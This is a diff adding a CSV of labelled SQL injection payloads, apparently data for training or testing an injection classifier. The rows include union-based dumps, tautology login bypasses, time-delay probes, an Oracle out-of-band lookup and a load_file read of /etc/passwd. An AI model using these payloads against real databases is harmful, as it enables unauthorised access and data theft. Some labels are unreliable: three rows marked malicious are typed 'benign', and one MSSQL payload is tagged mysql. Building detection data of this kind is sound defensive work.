@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+120,"select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
+121,"select * from users where id = 1 <@$$ union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @$$ union select detected — union_based injection (priority 7) on generic",rule-based
+122,"admin"" ) or ( ""1"" = ""1",1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
+123,"select * from users where id = 1 or 1#""@ union select 'a',version ( ) -- 1",1,,union_based,generic,0.95,"union select, @ union select detected — union_based injection (priority 7) on generic",rule-based
+124,"1 ) or benchmark ( 10000000,MD5 ( 1 ) ) #",1,,time_blind,generic,0.95,benchmark ( is database-specific time-delay function — time-based blind inference (priority 5),rule-based
+125,"select * from users where id = 1 union select .1_,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+126,AND 1 = utl_inaddr.get_host_address ( ( SELECT SYS.DATABASE_NAME FROM DUAL ) ) AND 'i' = 'i,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
+127,select * from users where id = 1 %$ 1 or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+128,select * from users where id = 1 %!<@ or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+129,"; if not ( substring ( ( select @@version ) ,25,1 ) <> 0 ) waitfor delay '0:0:2' --",1,,time_blind,mysql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+130,1 ) or sleep ( __TIME__ ) #,1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+131,"select * from users where id = 1 or ""1_"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+132,"select * from users where id = 1 <1## union select 1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
+133,"select * from users where id = 1 + $+*\ union select null,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
+134,select * from users where id = 1. <@ or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+135,or true--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+136,; execute immediate 'sel' || 'ect us' || 'er',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+137,hi' or 'x' = 'x';,1,,boolean_blind,generic,0.95,"or 'x' = 'x', or 'x' = 'x' detected — boolean_blind injection (priority 8) on generic",rule-based
+138,select * from users where id = 1 <@ or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+139,"select * from users where id = 1 or "".,"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+140,admin' #,1,,auth_bypass,generic,0.95,"admin' #, admin' # with admin prefix — auth bypass pattern (priority 9)",rule-based
+141,"select * from users where id = 1 <@$_ union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @$_ union select detected — union_based injection (priority 7) on generic",rule-based
+142,"select * from users where id = 1 or "", ( "" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+143,"select * from users where id = 1 or "",{"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+144,"union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",1,,out_of_band,mysql,0.95,load_file ( detected — out_of_band injection (priority 2) on mysql,rule-based
+145,""" ) ;waitfor delay '0:0:__TIME__'--",1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+146,"insert into mysql.user ( user, host, password ) values ( 'name', 'localhost', password ( 'pass123' ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+147,"admin"" or ""1"" = ""1""/*",1,,boolean_blind,generic,0.95,"or ""1"" = ""1"" detected — boolean_blind injection (priority 8) on generic",rule-based
+148,"select * from users where id = 1 or ""1 ( "" = 1 or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
+149,"select * from users where id = 1 or \<1 union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
